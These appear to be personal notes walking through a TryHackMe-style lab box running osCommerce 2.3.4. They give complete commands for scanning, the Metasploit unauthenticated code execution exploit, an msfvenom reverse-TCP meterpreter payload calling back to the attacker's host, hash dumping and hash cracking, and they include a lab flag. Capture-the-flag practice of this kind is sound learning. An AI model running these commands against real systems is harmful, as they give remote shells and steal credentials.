Lets first start off with a nmap scan
	nmap -sC -sV -vv -p- -Pn -A 10.10.194.148
		We found quiet a few ports open
		lets look at 8080
		http://10.10.194.148:8080/
	we can see a lot of different things in here, we even see a database schema
		lets do a gobuster
			gobuster dir -u http://10.10.194.148:8080/oscommerce-2.3.4/catalog/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
				WE CAN SEE AN INSTALL, LETS GO THERE
	Now lets start to look at that oscommerce information we found before
	we can search the web and see that there is remote execution exploits that can be used
		open metasploit
		search oscommerce and we can see that there is an installer for unathorized code execution
	use exploit/multi/http/oscommerce_installer_unauth_code_exec	
	lets check out the options portion
		we need a RHOSTS and RPORT along with a URI
	lets set the remote hosts
	set RHOSTS 10.10.194.148
	set RPORT 8080
	set URI /oscommerce-2.3.4/catalog/install/
		we are running a meterpreter shell
			lets get to the desktop and see if we find anything
				cd C:/
				cd Users
				cd Administrator
				cd Desktop
				cat root.txt.txt
			there is one flag THM{aea1e3ce6fe7f89e10cea833ae009bee}
		when we type in hashdump we have a problem, we are not stablizied, this means we need to load a payload to get farther into the system
	lets make a msf venom payload
		open a new terminal
			msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.23.228 LPORT=7777 -f exe > shell.exe
		go back to the meterpreter session and upload the shell.exe
			upload shell.exe
	open a new msfconsle terminal
		use exploit/multi/handler
		set lhosts 10.6.23.228
		set lport 7777
		set payload windows/meterpreter/reverse_tcp
		go back to meterpreter
			execute -f shell.exe
		now go back to metasploit
			run
				WE HAVE A STABLIZED METERPRETER SESSION!!!
				hashdump
			now we just need to crack some hashes!!!
				go to crackstation on the internet
				copy and paste the lab crack after the third : 
					30e87bf999828446a1c1209ddde4c450
						we have cracked the hash
